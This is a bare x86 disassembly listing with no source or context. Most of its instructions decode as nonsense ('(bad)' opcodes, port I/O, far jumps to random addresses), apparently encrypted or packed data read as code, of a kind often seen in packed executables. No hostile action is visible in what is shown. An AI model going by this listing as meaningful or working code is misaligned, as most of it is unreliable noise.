  4018e8:	cmp    DWORD PTR ds:0x433617,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43366f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	inc    ecx
  40192e:	gs mov ch,0xba
  401931:	dec    esi
  401932:	jnp    0x4019b0
  401934:	jl     0x40199d
  401936:	jle    0x4019b4
  401938:	jl     0x401912
  40193a:	xchg   esi,edi
  40193c:	loop   0x401994
  40193e:	ret    0xb4a7
  401941:	or     BYTE PTR ds:0xcdafbc66,ch
  401947:	pop    es
  401948:	aam    0x1c
  40194a:	dec    esp
  40194b:	mov    bh,dh
  40194d:	repnz cmp DWORD PTR [edx+edx*2-0x2e09e0e5],0xffffffea
  401956:	pop    esp
  401957:	fimul  WORD PTR [ebx-0x27ec2a78]
  40195d:	repz les edx,FWORD PTR [edx-0x35ac072c]
  401964:	popf   
  401965:	cmp    bl,BYTE PTR [edi]
  401967:	jnp    0x401993
  401969:	and    eax,0x1f369349
  40196e:	cli    
  40196f:	dec    ebp
  401970:	addr16 xor esp,edx
  401973:	mov    esp,0xf1f4c088
  401978:	add    eax,0xee71c420
  40197d:	lods   al,BYTE PTR ds:[esi]
  40197e:	adc    edx,ebx
  401980:	mov    cl,0x71
  401982:	mov    BYTE PTR [ebp-0x2e],cl
  401985:	jmp    DWORD PTR [ebx+0x155690b3]
  40198b:	mov    ebx,0x4fcb059f
  401990:	mov    ebp,0xc04d8bcb
  401995:	leave  
  401996:	xchg   ebx,eax
  401997:	pop    es
  401998:	add    cl,BYTE PTR [eax-0x32]
  40199b:	cmp    ch,BYTE PTR [esp-0x408308f8]
  4019a2:	add    ebp,DWORD PTR [esp+eiz*2-0x4d]
  4019a6:	popa   
  4019a7:	push   ebx
  4019a8:	sub    bl,BYTE PTR [edi]
  4019aa:	mov    DWORD PTR [ebp-0x47],ebx
  4019ad:	xchg   DWORD PTR [ebp+ebx*2+0x5eab7480],edx
  4019b4:	(bad)  
  4019b5:	pop    ss
  4019b6:	lods   al,BYTE PTR ds:[esi]
  4019b7:	jnp    0x401a0e
  4019b9:	stc    
  4019ba:	jo     0x401a0c
  4019bc:	fcmovnu st,st(7)
  4019be:	mov    BYTE PTR [edx+edx*2-0x296b35b8],bl
  4019c5:	(bad)
  4019c9:	xlat   BYTE PTR ds:[ebx]
  4019ca:	mov    ch,0x9e
  4019cc:	push   esp
  4019cd:	cmp    DWORD PTR [eax+0x56],ebp
  4019d0:	int    0xa5
  4019d2:	outs   dx,BYTE PTR ds:[esi]
  4019d3:	mov    WORD PTR [edi],ss
  4019d5:	or     bl,BYTE PTR [eax-0x4c]
  4019d8:	test   al,0x70
  4019da:	mov    dl,0x5a
  4019dc:	jbe    0x4019f1
  4019de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019df:	and    eax,0x622d5176
  4019e4:	add    bh,ch
  4019e6:	adc    al,dh
  4019e8:	imul   DWORD PTR [ebp-0x387d9aae]
  4019ee:	ins    DWORD PTR es:[edi],dx
  4019ef:	in     eax,0x2d
  4019f1:	loopne 0x40199a
  4019f3:	xchg   esi,eax
  4019f4:	sub    eax,0x31d56ea4
  4019f9:	adc    edi,ecx
  4019fb:	add    eax,0x765be9c9
  401a00:	ss xor al,0x48
  401a03:	mov    eax,0x7f20c244
  401a08:	mul    cl
  401a0a:	or     edi,DWORD PTR [ebx+eiz*4+0x7ed56a06]
  401a11:	push   cs
  401a12:	adc    dl,BYTE PTR [edi-0x7a]
  401a15:	int    0x1b
  401a17:	cmp    esp,DWORD PTR [edi+eiz*1+0x62]
  401a1b:	lods   eax,DWORD PTR ds:[esi]
  401a1c:	test   al,0x52
  401a1e:	dec    ecx
  401a1f:	es sub dl,0x5a
  401a23:	xchg   edx,eax
  401a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a25:	sbb    al,0x8d
  401a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a28:	sbb    bl,bl
  401a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a2b:	xchg   esp,eax
  401a2c:	sbb    eax,0xbf2ccae5
  401a31:	rcl    ecx,cl
  401a33:	fdivr  QWORD PTR [edx]
  401a35:	or     eax,DWORD PTR [edi+0x7d89d800]
  401a3b:	adc    DWORD PTR [ebx+0x52c00857],eax
  401a41:	cmp    esi,DWORD PTR [edi]
  401a43:	xchg   edi,eax
  401a44:	out    0xa2,eax
  401a46:	ins    BYTE PTR es:[edi],dx
  401a47:	mov    bh,0x48
  401a49:	test   BYTE PTR [edx],al
  401a4b:	cmp    BYTE PTR ds:0xd5e5623a,cl
  401a51:	daa    
  401a52:	fimul  DWORD PTR [edi]
  401a54:	push   es
  401a55:	jb     0x401a92
  401a57:	add    edx,ecx
  401a59:	sub    ebx,edi
  401a5b:	ins    BYTE PTR es:[edi],dx
  401a5c:	icebp  
  401a5d:	in     ax,0x61
  401a60:	ret    0x8548
  401a63:	imul   edi,DWORD PTR [edx],0x2
  401a66:	jno    0x401a84
  401a68:	add    BYTE PTR ds:0x939c7548,dh
  401a6e:	mov    ds:0x9d284a0f,al
  401a73:	mov    WORD PTR [ebx-0x18],ds
  401a76:	popa   
  401a77:	add    DWORD PTR [edx+0x6c],edx
  401a7a:	xor    BYTE PTR [eax-0x28477073],dl
  401a80:	cmp    eax,0xa5999dd9
  401a85:	xor    al,0x7f
  401a87:	mov    ds:0x417e1372,al
  401a8c:	ins    BYTE PTR es:[edi],dx
  401a8d:	push   0x64
  401a8f:	xor    al,0xb7
  401a91:	test   edx,ebx
  401a93:	dec    esi
  401a94:	and    BYTE PTR [esi-0xd],0x23
  401a98:	fwait
  401a99:	or     esp,DWORD PTR [ecx]
  401a9b:	jae    0x401aa6
  401a9d:	(bad)
  401aa0:	data16 and al,0xad
  401aa3:	sbb    BYTE PTR [eax],0xb1
  401aa6:	pop    ebp
  401aa7:	add    DWORD PTR [ebp-0x5a],0x54d4243b
  401aae:	push   0xffffffdc
  401ab0:	test   al,0xd6
  401ab2:	gs mov dh,0xe4
  401ab5:	pop    edi
  401ab6:	or     ah,cl
  401ab8:	shl    BYTE PTR [edi-0x1f],0x3c
  401abc:	adc    ecx,DWORD PTR [eax-0x7f]
  401abf:	jl     0x401a7d
  401ac1:	cli    
  401ac2:	adc    bl,cl
  401ac4:	or     al,0x17
  401ac6:	(bad)  
  401ac7:	xchg   ecx,eax
  401ac8:	sub    DWORD PTR [eax+0x2c],ebx
  401acb:	jmp    0x401adf
  401acd:	in     eax,0xf8
  401acf:	mov    BYTE PTR [esi-0x35b11caf],dh
  401ad5:	bound  ecx,QWORD PTR [ebp-0x1d21c3bc]
  401adb:	jmp    0x401aa1
  401add:	xor    al,0x48
  401adf:	leave  
  401ae0:	jge    0x401b18
  401ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ae3:	cdq    
  401ae4:	xchg   edx,eax
  401ae5:	push   cs
  401ae6:	xor    ebx,ecx
  401ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ae9:	mov    esp,ebp
  401aeb:	xchg   esp,eax
  401aec:	push   ebx
  401aed:	add    ebx,DWORD PTR [edx+0x449b39c9]
  401af3:	or     ch,dl
  401af5:	mov    ds:0xace5dd06,al
  401afa:	aaa    
  401afb:	clc    
  401afc:	jnp    0x401b42
  401afe:	in     al,dx
  401aff:	stos   BYTE PTR es:[edi],al
  401b00:	and    dl,BYTE PTR ds:0xb49d9722
  401b06:	stos   BYTE PTR es:[edi],al
  401b07:	xor    DWORD PTR [ebx],esi
  401b09:	call   FWORD PTR [edx-0x556e780]
  401b0f:	jge    0x401b52
  401b11:	pop    edx
  401b12:	mov    edx,0x448fbdb7
  401b17:	aad    0x21
  401b19:	seto   BYTE PTR [ebx-0x5e29dc2]
  401b20:	nop
  401b21:	push   esp
  401b22:	mov    ch,0xfb
  401b24:	cdq    
  401b25:	xchg   bh,al
  401b27:	test   BYTE PTR [edi-0x6aeac55a],0x75
  401b2e:	pop    ss
  401b2f:	call   0xe6a9:0x656d59bd
  401b36:	xchg   DWORD PTR [bx+di-0x3a63],edi
  401b3b:	push   es
  401b3c:	stos   BYTE PTR es:[edi],al
  401b3d:	aas    
  401b3e:	and    al,0x7e
  401b40:	pop    eax
  401b41:	mov    eax,0xe8f1e528
  401b46:	add    cl,BYTE PTR [ebp-0x1c]
  401b49:	xchg   esi,eax
  401b4a:	inc    edx
  401b4b:	das    
  401b4c:	pop    edx
  401b4d:	sub    al,BYTE PTR [ecx]
  401b4f:	dec    BYTE PTR [esi+ebx*8+0x1100105d]
  401b56:	lock sbb DWORD PTR [ecx+0x61],ebp
  401b5a:	pop    esi
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	and    BYTE PTR [edx+0x26],bh
  401b5f:	iret   
  401b60:	jge    0x401b38
  401b62:	and    eax,DWORD PTR [edi+0x1b3c2eab]
  401b68:	data16 sti 
  401b6a:	push   0xfffffff5
  401b6c:	and    edi,edi
  401b6e:	cmp    esp,eax
  401b70:	sub    dh,BYTE PTR [edx+0x174421b3]
  401b76:	stc    
  401b77:	push   edi
  401b78:	das    
  401b79:	jo     0x401b6e
  401b7b:	pop    ss
  401b7c:	xor    DWORD PTR [ecx+ebp*2+0x4aae2057],ebp
  401b83:	or     BYTE PTR [edi-0x8b60986],bl
  401b89:	enter  0x609a,0xbc
  401b8d:	push   esi
  401b8e:	xor    eax,0x36e549f0
  401b93:	mov    ecx,cs
  401b95:	(bad)  
  401b96:	fnsave [ebx]
  401b98:	pop    esi
  401b99:	sub    edi,DWORD PTR [ecx+0x1b181516]
  401b9f:	std    
  401ba0:	lock je 0x401b90
  401ba3:	jmp    0x6b844b9c
  401ba8:	ret    0xce84
  401bab:	aas    
  401bac:	mov    ebp,0x5cad1e8d
  401bb1:	aas    
  401bb2:	inc    esi
  401bb3:	jmp    0x4d605dc8
  401bb8:	jg     0x401b65
  401bba:	add    ebx,edx
  401bbc:	fistp  WORD PTR ds:0xce57fee6
  401bc2:	pop    ecx
  401bc3:	aas    
  401bc4:	jbe    0x401c1c
  401bc6:	cdq    
  401bc7:	iret   
  401bc8:	mov    dl,0xc1
  401bca:	std    
  401bcb:	sbb    BYTE PTR ss:[edi-0x20e2a039],dh
  401bd2:	jecxz  0x401c41
  401bd4:	sub    BYTE PTR [ecx+0x10fd4d35],ch
  401bda:	call   0x2f8e86da
  401bdf:	arpl   cx,cx
  401be1:	popf   
  401be2:	mov    ecx,0x8d0b92bb
  401be7:	in     eax,dx
  401be8:	add    BYTE PTR [eax-0x718d7df3],0xdf
  401bef:	xor    BYTE PTR [edi-0x3855d2ca],ch
  401bf5:	outs   dx,BYTE PTR ds:[esi]
  401bf6:	das    
  401bf7:	or     bh,ah
  401bf9:	in     al,dx
  401bfa:	mov    BYTE PTR [eax-0x17],cl
  401bfd:	push   ss
  401bfe:	imul   ebp,DWORD PTR [ecx-0x39],0x5ded428e
  401c05:	xchg   DWORD PTR [edi],ecx
  401c07:	cmp    al,0xfb
  401c09:	sub    dh,BYTE PTR [edi]
  401c0b:	lahf   
  401c0c:	shl    BYTE PTR [edx+0xc],cl
  401c0f:	sbb    al,0x6e
  401c11:	enter  0xc2d9,0xb7
  401c15:	and    eax,0xab4063a1
  401c1a:	mov    al,0xba
  401c1c:	(bad)  
  401c1d:	push   esp
  401c1e:	inc    eax
  401c1f:	jno    0x401bde
  401c21:	test   al,0x33
  401c23:	into   
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0xd1a983cc
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c19
  401c4b:	in     al,dx
  401c4c:	repz jne 0x401c06
  401c4f:	mov    ch,0xcb
  401c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c52:	inc    ecx
  401c53:	or     esp,esi
  401c55:	sub    BYTE PTR [edi+0x6e],0x60
  401c59:	shr    BYTE PTR [edi],cl
  401c5b:	js     0x401c3f
  401c5d:	int3   
  401c5e:	lds    ebx,FWORD PTR [edx+0x51c4d103]
  401c64:	pop    edi
  401c65:	xchg   edx,eax
  401c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c67:	ins    BYTE PTR es:[edi],dx
  401c68:	adc    edx,esi
  401c6a:	(bad)  
  401c6b:	mov    bh,0x65
  401c6d:	jmp    0x78bf:0x16f3b7c6
  401c74:	and    BYTE PTR [ecx],ch
  401c76:	pusha  
  401c77:	pushf  
  401c78:	jo     0x401cd1
  401c7a:	mov    bl,BYTE PTR [eax-0x5360654c]
  401c80:	gs ret 0xdd51
  401c84:	jae    0x401ca7
  401c86:	push   esi
  401c87:	jmp    0x8cc562bf
  401c8c:	pop    esp
  401c8d:	inc    esp
  401c8e:	add    al,0x7
  401c90:	ja     0x401c13
  401c92:	ins    DWORD PTR es:[edi],dx
  401c93:	mov    ecx,0x8f4da611
  401c98:	mov    DWORD PTR [ebx],edi
  401c9a:	mov    al,ds:0xcb24867e
  401c9f:	retf   
  401ca0:	add    ebp,ebx
  401ca2:	adc    al,BYTE PTR [esp+eax*8+0x31]
  401ca6:	idiv   BYTE PTR [ebp-0x1c4202f5]
  401cac:	jno    0x401c6f
  401cae:	mov    ebx,DWORD PTR [esi-0x28]
  401cb1:	repz dec edi
  401cb3:	jnp    0x401ca8
  401cb5:	mov    eax,0x79833630
  401cba:	shl    DWORD PTR [esi-0x77f21be2],1
  401cc0:	sar    DWORD PTR [ecx+edx*4-0x6d5fff1],0xf5
  401cc8:	cmp    eax,0x4b5e76fe
  401ccd:	mov    esp,0xb9cd6184
  401cd2:	mov    eax,0x50d14117
  401cd7:	push   ebx
  401cd8:	push   0x181a0b1b
  401cdd:	jo     0x401caf
  401cdf:	pop    ebx
  401ce0:	xor    BYTE PTR [edx-0x7750b38a],dl
  401ce6:	jmp    FWORD PTR [edi-0x505326f0]
  401cec:	cmp    al,0x3e
  401cee:	lds    ecx,FWORD PTR ds:0x29fc610d
  401cf4:	test   DWORD PTR [ebx],esp
  401cf6:	lods   eax,DWORD PTR ds:[esi]
  401cf7:	sar    BYTE PTR [eax-0xcf15e93],cl
  401cfd:	jge    0x401d53
  401cff:	dec    edi
  401d00:	push   esp
  401d01:	push   cs
  401d02:	cmp    dh,BYTE PTR [edi]
  401d04:	mov    edi,0x9c4cab6b
  401d09:	ds gs call 0x2e181bfd
  401d10:	ja     0x401ca4
  401d12:	mov    ch,0xb6
  401d14:	retf   0x4d9
  401d17:	out    dx,eax
  401d18:	nop
  401d19:	pop    esi
  401d1a:	js     0x401d74
  401d1c:	cwde   
  401d1d:	xor    bl,dl
  401d1f:	pop    eax
  401d20:	inc    ebx
  401d21:	in     al,0x82
  401d23:	das    
  401d24:	jne    0x401d70
  401d26:	inc    esi
  401d27:	(bad)  
  401d28:	fisubr WORD PTR [edi-0x76]
  401d2b:	add    eax,0xb22a7b50
  401d30:	sub    eax,0xb8c1450a
  401d35:	aad    0xe2
  401d37:	test   eax,esi
  401d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d3a:	sub    bl,BYTE PTR [edi]
  401d3c:	fidivr DWORD PTR [edx+0x4b603946]
  401d42:	dec    edx
  401d43:	ror    BYTE PTR [ecx+0x4c],1
  401d46:	xchg   esp,eax
  401d47:	(bad)  
  401d48:	out    0x7,al
  401d4a:	pop    DWORD PTR [eax]
  401d4c:	pop    edi
  401d4d:	loop   0x401ced
  401d4f:	push   edx
  401d50:	xchg   BYTE PTR [esi-0x52b40810],ah
  401d56:	jo     0x401d27
  401d58:	push   esi
  401d59:	sbb    BYTE PTR [eax],bl
  401d5b:	add    eax,0xaaabe613
  401d60:	pop    ebx
  401d61:	jmp    0xbdab:0x8ebbe97e
  401d68:	out    dx,eax
  401d69:	push   edi
  401d6a:	pushf  
  401d6b:	in     al,dx
  401d6c:	sti    
  401d6d:	in     al,0xaf
  401d6f:	test   al,0x8a
  401d71:	dec    edi
  401d72:	mov    ds:0xadeff827,al
  401d77:	fwait
  401d78:	or     esi,DWORD PTR [eax]
  401d7a:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  401d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d7d:	xlat   BYTE PTR ds:[ebx]
  401d7e:	xlat   BYTE PTR ds:[ebx]
  401d7f:	rol    BYTE PTR [edx-0x63],1
  401d82:	clc    
  401d83:	push   esi
  401d84:	dec    edi
  401d85:	in     eax,0x82
  401d87:	mov    ecx,0xbc4a926
  401d8c:	into   
  401d8d:	and    eax,0x2119ba6f
  401d92:	imul   eax,DWORD PTR [ebx-0x23b55ef9],0x56
  401d99:	mov    edi,ebx
  401d9b:	jge    0x401d96
  401d9d:	pop    esi
  401d9e:	cmp    al,0xa0
  401da0:	ins    BYTE PTR es:[edi],dx
  401da1:	mov    ds,WORD PTR [edi-0x60]
  401da4:	xchg   edi,eax
  401da5:	ja     0x401d37
  401da7:	add    eax,0x9094875c
  401dac:	lds    esp,FWORD PTR [eax-0x4a84c13a]
  401db2:	or     BYTE PTR [ecx],cl
  401db4:	push   cs
  401db5:	clc    
  401db6:	(bad)  
  401db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401db8:	cmc    
  401db9:	mov    ebx,0xa39c3254
  401dbe:	sub    al,0x61
  401dc0:	mov    ds:0x486f623a,eax
  401dc5:	jmp    0x401d79
  401dc7:	sub    esp,DWORD PTR [ebx+0x69dc04df]
  401dcd:	out    dx,eax
  401dce:	mov    edx,0x62936375
  401dd3:	push   ecx
  401dd4:	adc    BYTE PTR [ebp+0x60],bl
  401dd7:	sub    bh,BYTE PTR [esi+0x65fc493]
  401ddd:	pusha  
  401dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ddf:	jo     0x401e03
  401de1:	or     eax,0x9c801fa1
  401de6:	mov    dl,0x1a
  401de8:	shl    BYTE PTR [edx-0x71b3efab],1
  401dee:	push   eax
  401def:	adc    al,0xd9
  401df1:	mov    esp,0x781b8343
  401df6:	dec    esi
  401df7:	xchg   ebp,eax
  401df8:	sub    ecx,DWORD PTR [ebx-0x7932c84e]
  401dfe:	repnz jecxz 0x401dfb
  401e01:	xlat   BYTE PTR ds:[ebx]
  401e02:	rcl    dx,cl
  401e05:	call   FWORD PTR [eax+eax*1]
  401e08:	iret   
  401e09:	jb     0x401d9a
  401e0b:	and    DWORD PTR [ecx],0xfffffffd
  401e0e:	jns    0x401e1e
  401e10:	pushf  
  401e11:	aad    0x48
  401e13:	mov    al,ds:0xd2fc57dc
  401e18:	dec    esp
  401e19:	ins    DWORD PTR es:[edi],dx
  401e1a:	and    BYTE PTR [eax],bh
  401e1c:	ficom  WORD PTR [ecx]
  401e1e:	call   0x38c0:0xa03776fb
  401e25:	mov    BYTE PTR [edi],cl
  401e27:	cli    
  401e28:	push   es
  401e29:	call   DWORD PTR [ecx+0x68]
  401e2c:	jae    0x401e14
  401e2e:	pushf  
  401e2f:	xor    eax,0xf431e95d
  401e34:	xor    bl,bh
  401e36:	shl    DWORD PTR ds:0x340738e5,0x92
  401e3d:	dec    eax
  401e3e:	hlt    
  401e3f:	syscall 
  401e41:	mov    cl,BYTE PTR [eax-0x12]
  401e44:	fdivr  DWORD PTR [edi]
  401e46:	outs   dx,DWORD PTR ds:[esi]
  401e47:	dec    ecx
  401e48:	out    dx,al
  401e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e4a:	or     DWORD PTR [ebx],esi
  401e4c:	dec    ebx
  401e4d:	mov    WORD PTR [edi+ebx*8-0x59],fs
  401e51:	inc    ebx
  401e52:	sbb    dh,BYTE PTR [ebx+eiz*8]
  401e55:	mov    DWORD PTR [ecx-0x64],esp
  401e58:	ja     0x401dfd
  401e5a:	es adc al,0x63
  401e5d:	dec    ecx
  401e5e:	add    edi,DWORD PTR [ecx]
  401e60:	pop    eax
  401e61:	sub    bh,BYTE PTR [esi]
  401e63:	xor    ah,BYTE PTR [ebp-0xc]
  401e66:	repz cmp DWORD PTR [eax],ebx
  401e69:	iret   
  401e6a:	adc    eax,0x283d5718
  401e6f:	or     ch,BYTE PTR [esi+0x7f5a6dab]
  401e75:	adc    eax,0xb873fba5
  401e7a:	fwait
  401e7b:	pop    DWORD PTR [eax]
  401e7d:	data16 sahf 
  401e7f:	push   esi
  401e80:	add    DWORD PTR [ebp+0x293e1006],esp
  401e86:	lds    ebx,FWORD PTR [eax]
  401e88:	xchg   ecx,eax
  401e89:	mov    ds:0x5f120a4f,eax
  401e8e:	add    BYTE PTR [edi+0x14],al
  401e91:	push   cs
  401e92:	cmc    
  401e93:	or     DWORD PTR [ebp+0x20e75d89],eax
  401e99:	test   al,0x11
  401e9b:	aaa    
  401e9c:	imul   eax,edi,0xffffffa6
  401e9f:	sub    al,0x13
  401ea1:	mov    ebx,0x7990a280
  401ea6:	xchg   ecx,eax
  401ea7:	adc    BYTE PTR [ecx],ah
  401ea9:	mov    dh,0xad
  401eab:	sbb    al,0xb
  401ead:	ret    
  401eae:	je     0x401e65
  401eb0:	ins    DWORD PTR es:[edi],dx
  401eb1:	cli    
  401eb2:	nop
  401eb3:	adc    eax,eax
  401eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eb6:	scas   al,BYTE PTR es:[edi]
  401eb7:	cmp    ecx,DWORD PTR [eax+eiz*1+0x592a8346]
  401ebe:	dec    edi
  401ebf:	mov    edx,0xb8f00950
  401ec4:	mov    dh,0xb0
  401ec6:	cwde   
  401ec7:	dec    ecx
  401ec8:	call   0xd17101a0
  401ecd:	dec    esi
  401ece:	adc    edx,edi
  401ed0:	inc    ebp
  401ed1:	sbb    al,BYTE PTR [ebx+0x44942d39]
  401ed7:	ins    DWORD PTR es:[edi],dx
  401ed8:	jo     0x401ed2
  401eda:	push   edi
  401edb:	cmp    dl,bl
  401edd:	pusha  
  401ede:	mov    ds:0xd91f111c,al
  401ee3:	and    esi,DWORD PTR [esi-0x7d]
  401ee6:	cdq    
  401ee7:	jmp    0x6827:0xd4e9fa72
  401eee:	mov    al,ds:0x5cb00efb
  401ef3:	mov    al,ds:0x13a8ef0b
  401ef8:	jmp    0xeb95:0xc3b3187f
  401eff:	es cmp eax,0xf74a1064
  401f05:	mov    al,ds:0x947d8705
  401f0a:	sbb    ebx,esp
  401f0c:	mov    ds:0x47915ad2,al
  401f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f12:	xor    BYTE PTR [esi-0x42897ca0],0xb0
  401f19:	dec    eax
  401f1a:	and    ecx,DWORD PTR [edi]
  401f1c:	add    eax,0xa99d156d
  401f21:	xchg   DWORD PTR [eax],esp
  401f23:	inc    edi
  401f24:	(bad)  
  401f25:	lods   al,BYTE PTR ds:[esi]
  401f26:	or     al,0xc6
  401f28:	mov    al,ds:0xcf2a9546
  401f2d:	adc    BYTE PTR [edi+0x34ac9f6a],cl
  401f33:	mov    eax,ds:0x413bea
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0xb55e8250
  401f5d:	lea    ebx,[eax+0x677c7c01]
  401f63:	jle    0x401fe1
  401f65:	jl     0x401f18
  401f67:	adc    esi,DWORD PTR [esi]
  401f69:	int    0x6b
  401f6b:	pop    es
  401f6c:	add    al,0x5c
  401f6e:	xchg   esp,eax
  401f6f:	lods   eax,DWORD PTR ds:[esi]
  401f70:	ins    BYTE PTR es:[edi],dx
  401f71:	adc    BYTE PTR [esi+edi*8+0x4b],0xc5
  401f76:	jns    0x401f95
  401f78:	outs   dx,BYTE PTR ds:[esi]
  401f79:	sti    
  401f7a:	jecxz  0x401f24
  401f7c:	sub    al,0xec
  401f7e:	stos   DWORD PTR es:[edi],eax
  401f7f:	mov    ebp,0x77cd320e
  401f84:	out    0xf4,al
  401f86:	dec    ebx
  401f87:	inc    ebx
  401f88:	pop    ecx
  401f89:	jo     0x401f95
  401f8b:	daa    
  401f8c:	sbb    eax,0x1d7ffc1b
  401f91:	xchg   DWORD PTR [ebx-0xa8cae4b],edi
  401f97:	pop    DWORD PTR [ebx+0x398ed9c8]
  401f9d:	mov    ch,0x4
  401f9f:	test   BYTE PTR [edx+0x3dce3941],cl
  401fa5:	fstp   QWORD PTR [edi-0x2d]
  401fa8:	mov    ebp,0xe75a9771
  401fad:	in     eax,dx
  401fae:	imul   DWORD PTR [eax+0x30]
  401fb1:	mov    ecx,0xce475981
  401fb6:	cwde   
  401fb7:	cld    
  401fb8:	mov    eax,DWORD PTR ss:[eax]
  401fbb:	inc    edi
  401fbc:	xchg   esp,eax
  401fbd:	nop
  401fbe:	adc    DWORD PTR [eax],esi
  401fc0:	ror    BYTE PTR [eax-0x2e],1
  401fc3:	dec    ecx
  401fc4:	lea    ebx,[esi]
  401fc6:	imul   edi,DWORD PTR ds:0x661f3ae1,0xffffffa0
  401fcd:	sbb    eax,0x73f3de83
  401fd2:	ret    0x6c5b
  401fd5:	jmp    DWORD PTR [eax-0x2]
  401fd8:	mov    bh,0x97
  401fda:	call   0xbe0282b3
  401fdf:	icebp  
  401fe0:	clc    
  401fe1:	in     eax,dx
  401fe2:	aam    0x2e
  401fe4:	inc    ebp
  401fe5:	rcl    DWORD PTR [esi-0x7],cl
  401fe8:	jne    0x401fab
  401fea:	and    DWORD PTR [esi+ebp*4+0x28],ebp
  401fee:	mov    ecx,0xba94b268
  401ff3:	sub    edi,DWORD PTR [ebp+0x24c047c1]
  401ff9:	std    
  401ffa:	jl     0x401f89
  401ffc:	xor    DWORD PTR [eax+eiz*2],0x6792e7e5
  402003:	inc    ecx
  402004:	std    
  402005:	mov    bh,0xf9
  402007:	js     0x401fd2
  402009:	inc    edi
  40200a:	lock in al,0x7e
  40200d:	int3   
  40200e:	adc    eax,0x14d48c5d
  402013:	adc    BYTE PTR [eax],0x4
  402016:	xchg   edx,edi
  402018:	cwde   
  402019:	dec    ebx
  40201a:	inc    ecx
  40201b:	lods   eax,DWORD PTR ds:[esi]
  40201c:	xchg   ecx,eax
  40201d:	jae    0x401fea
  40201f:	push   esp
  402020:	outs   dx,BYTE PTR ds:[esi]
  402021:	stos   DWORD PTR es:[edi],eax
  402022:	mov    bl,0x1a
  402024:	dec    esp
  402025:	sbb    esi,DWORD PTR [edx-0x2a]
  402028:	cmp    BYTE PTR [edx+0x6422e122],dh
  40202e:	xlat   BYTE PTR ds:[ebx]
  40202f:	fnstsw WORD PTR [edi+eax*8-0x15]
  402033:	and    bl,cl
  402035:	mov    edi,0xc9a4c828
  40203a:	lock or al,0xd3
  40203d:	mov    ds:0x29bcf3d1,eax
  402042:	test   al,0x5a
  402044:	repnz das 
  402046:	dec    esi
  402047:	sub    eax,0xb2715e93
  40204c:	loop   0x402026
  40204e:	add    eax,0x291fc6db
  402053:	push   0xfffffff5
  402055:	(bad)  
  402056:	sub    eax,0x32aa8136
  40205b:	lahf   
  40205c:	in     al,0x7f
  40205e:	sub    BYTE PTR [ebx+0x54],ch
  402061:	ror    esp,0xbc
  402064:	cs jecxz 0x40207c
  402067:	scas   al,BYTE PTR es:[edi]
  402068:	sbb    al,0x4a
  40206a:	(bad)  
  40206c:	pop    ebx
  40206d:	outs   dx,DWORD PTR ds:[esi]
  40206e:	gs jge 0x402035
  402071:	inc    ebp
  402072:	xchg   ebx,eax
  402073:	jb     0x402016
  402075:	mov    dh,0x96
  402077:	or     al,0x31
  402079:	mov    WORD PTR [edx-0x5106853c],cs
  40207f:	fdiv   QWORD PTR [esi]
  402081:	stos   DWORD PTR es:[edi],eax
  402082:	bts    edi,ecx
  402085:	shl    edx,0x7
  402088:	call   0xe7fdfd75
  40208d:	outs   dx,DWORD PTR ds:[esi]
  40208e:	push   esp
  40208f:	or     bh,bh
  402091:	mov    ss,WORD PTR [edx+0x70]
  402094:	rcl    esi,1
  402096:	outs   dx,DWORD PTR ds:[esi]
  402097:	add    al,0xdd
  402099:	cmp    bh,BYTE PTR [ebp-0x48f77582]
  40209f:	mov    WORD PTR [ebx-0x3c],?
  4020a2:	stc    
  4020a3:	inc    ecx
  4020a4:	lock and eax,0xc40977ba
  4020aa:	imul   edx,DWORD PTR [ebx+0x24],0xffffffef
  4020ae:	mov    ds:0x9abfb59a,al
  4020b3:	in     al,dx
  4020b4:	inc    eax
  4020b5:	mov    al,ds:0x983d0bd2
  4020ba:	inc    eax
  4020bb:	(bad)  
  4020bc:	pop    ebx
